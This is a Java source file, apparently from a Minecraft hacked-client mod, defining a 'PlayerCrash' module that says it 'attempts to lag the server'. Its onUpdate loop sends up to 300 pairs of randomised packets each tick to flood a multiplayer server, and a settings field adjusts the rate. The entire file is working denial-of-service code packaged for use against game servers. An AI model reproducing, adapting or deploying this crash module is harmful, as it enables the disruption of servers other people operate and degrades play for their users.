package net.zebra.quiverone.modules.crash;

import net.minecraft.class_2827;
import net.minecraft.class_2828;
import net.zebra.quiverone.modules.Category;
import net.zebra.quiverone.modules.Module;
import net.zebra.quiverone.modules.setting.Setting;
import net.zebra.quiverone.modules.setting.settings.BooleanSetting;
import net.zebra.quiverone.modules.setting.settings.NumberSetting;

public class PlayerCrash extends Module {
   private BooleanSetting autoDisable = new BooleanSetting("AutoDisable", this, true);
   private BooleanSetting sendMessage = new BooleanSetting("Send Message", this, true);
   public NumberSetting speed = new NumberSetting("Speed", this, 100.0D, 1.0D, 300.0D, 1.0D);

   public PlayerCrash() {
      super("Player", "Attempts to lag the server", Category.CRASH, -1, false, true);
      this.addSetting(new Setting[]{this.speed, this.autoDisable, this.sendMessage});
   }

   public void onUpdate() {
      for(int i = 0; (double)i < this.speed.getValue(); ++i) {
         mc.field_1724.field_3944.method_2883(new class_2828(Math.random() >= 0.5D));
         mc.field_1724.field_3944.method_2883(new class_2827((long)((int)(Math.random() * 8.0D))));
      }

   }
}
